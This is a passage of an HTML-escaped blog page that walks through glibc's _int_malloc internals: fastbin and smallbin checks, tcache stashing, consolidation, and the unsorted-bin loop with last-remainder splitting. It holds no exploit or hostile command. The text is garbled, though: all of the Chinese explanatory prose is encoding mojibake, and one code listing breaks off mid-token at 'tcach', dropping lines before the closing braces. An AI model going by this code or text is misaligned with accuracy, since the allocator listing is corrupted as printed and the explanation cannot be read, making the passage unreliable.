СИГ№╝їжў▓ТГбС╝фжђа&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (fastbin_index (chunksize (victim)) != idx,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            errstr = &lt;span class=&#34;string&#34;&gt;&amp;quot;malloc():memory corruption (fast)&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            errout:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            malloc_printerr (check_action,errstr,chunk2mem (victim),av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        check_remalloced_chunk (av,victim,nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = chunk2mem (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        alloc_perturb (p,bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ3№╝ЅуёХтљј№╝їТБђТЪЦ small bin СИГТў»тљдТюЅтљѕжђѓуџё chunkсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (in_smallbin_range (nb))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      idx = smallbin_index (nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      bin = bin_at (av, idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((victim = last (bin)) != bin)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          bck = victim-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (bck-&amp;gt;fd != victim)) &lt;span class=&#34;comment&#34;&gt;//у▒╗С╝╝unlinkТБђТЪЦ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): smallbin double linked list corrupted&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          set_inuse_bit_at_offset (victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          bin-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          bck-&amp;gt;fd = bin;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (av != &amp;amp;main_arena)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            set_non_main_arena (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          check_malloced_chunk (av, victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; USE_TCACHE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;comment&#34;&gt;/* While we&amp;#x27;re here, if we see other chunks of the same size,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;             stash them in the tcache.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; tc_idx = csize2tidx (nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (tcache &amp;amp;&amp;amp; tc_idx &amp;lt; mp_.tcache_bins)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              mchunkptr tc_victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;comment&#34;&gt;/* While bin not empty and tcache not full, copy chunks over.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (tcache-&amp;gt;counts[tc_idx] &amp;lt; mp_.tcache_count&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &amp;amp;&amp;amp; (tc_victim = last (bin)) != bin)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (tc_victim != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      bck = tc_victim-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      set_inuse_bit_at_offset (tc_victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (av != &amp;amp;main_arena)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        set_non_main_arena (tc_victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      bin-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      bck-&amp;gt;fd = bin;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      tcach                   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = chunk2mem (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          alloc_perturb (p, bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ4№╝ЅТГцтљј№╝їТЋ┤уљє fast bin №╝їУ«Ау«Ќ large bin уџё indexсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//тѕ░У┐ЎжЄїУ┐ўСИЇУЃйТ╗АУХ│№╝їт░▒У░Ѓуће malloc_consolidate() ТЋ┤уљє fastbins №╝їТѕќУ«Ит░▒С╝џТюЅтљѕжђѓуџё chunk &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    idx = largebin_index (nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (have_fastchunks (av))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        malloc_consolidate (av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ5№╝ЅТјЦСИІТЮЦ№╝їтЄйТЋ░У┐ЏтЁЦСИђСИфтцДуџётцќт▒ѓтЙфуј» for тЙфуј»№╝їтїЁтљФС║є _int_malloc () тЄйТЋ░С╣ІтљјуџёТЅђТюЅУ┐ЏуеІсђѓу┤ДТјЦуЮђТў»тєЁт▒ѓуггСИђСИф while тЙфуј»№╝їт«ЃС╝џжЂЇтјє unsorted bin СИГуџёТ»ЈСИђСИф chunk №╝їтдѓТъютцДт░ЈТГБтЦйтљѕжђѓ№╝їт░▒т░єтЁХтЈќтЄ║№╝їтљдтѕЎт░▒т░єтЁХТћЙтЁЦ small bin ТѕќУђЁ large binсђѓУ┐ЎТў»тћ»СИђуџёт░є chunk ТћЙУ┐Џ small bin ТѕќУђЁ large bin уџёУ┐ЄуеІсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (;; ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; iters = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((victim = unsorted_chunks (av)-&amp;gt;bk) != unsorted_chunk (av)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bck = victim-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (victim-&amp;gt;size &amp;lt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * SIZE_SZ ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           || __builtin_expect (victim-&amp;gt;size &amp;gt;&amp;gt; av-&amp;gt;system_mem,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            malloc_printerr (check_action,&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc():memory corruption&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                             chunk2mem (victim),av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        size = chunksize (victim);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ6№╝ЅтюетєЁт▒ѓуггСИђСИфтЙфуј»тєЁжЃе№╝їтйЊУ»иТ▒ѓуџё chunk т▒ъС║ј small bin сђЂ unsorted bin тЈфТюЅСИђСИф chunk СИ║ last remainder т╣ХСИћТ╗АУХ│ТІєтѕєТЮАС╗ХТЌХ№╝їт░▒т░єтЁХТІєтѕєсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (in_smallbin_range (nb) &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              bck == unsorted_chunks (av) &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              victim == av-&amp;gt;last_remainder &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (size) &amp;gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (nb + MINSIZE))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;comment&#34;&gt;/* split and reattach remainder */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              remainder_size = size - nb;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              remainder = chunk_at_offset (victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              unsorted_chunks (av)-&amp;gt;bk = unsorted_chunks (av)-&amp;gt;fd = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              av-&amp;gt;last_remainder = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              remainder-&amp;gt;bk = remainder-&amp;gt;fd = unsorted_chunks (av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_smallbin_range (remainder_size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  remainder-&amp;gt;fd_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  remainder-&amp;gt;bk_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              set_head (victim, nb | PREV_INUSE |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        (av != &amp;amp;main_arena ? NON_MAIN_ARENA : &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              set_head (remainder, remainder_size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            set_foot (remainder, remainder_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              check_malloced_chunk (av, victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = chunk2mem (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              alloc_perturb (p, bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ7№╝ЅТјЦуЮђ№╝їт░є chunk С╗ј unsorted bin СИГуД╗жЎц№╝їтдѓТъютцДт░ЈТГБтљѕжђѓ№╝їт░▒т░єтЁХУ┐ћтЏъу╗ЎућеТѕисђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (bck-&amp;gt;fd != victim))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): corrupted unsorted chunks 3&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          unsorted_chunks (av)-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          bck-&amp;gt;fd = unsorted_chunks (av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;comment&#34;&gt;/* Take now instead of binning if exact fit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (size == nb)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              set_inuse_bit_at_offset (victim, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span 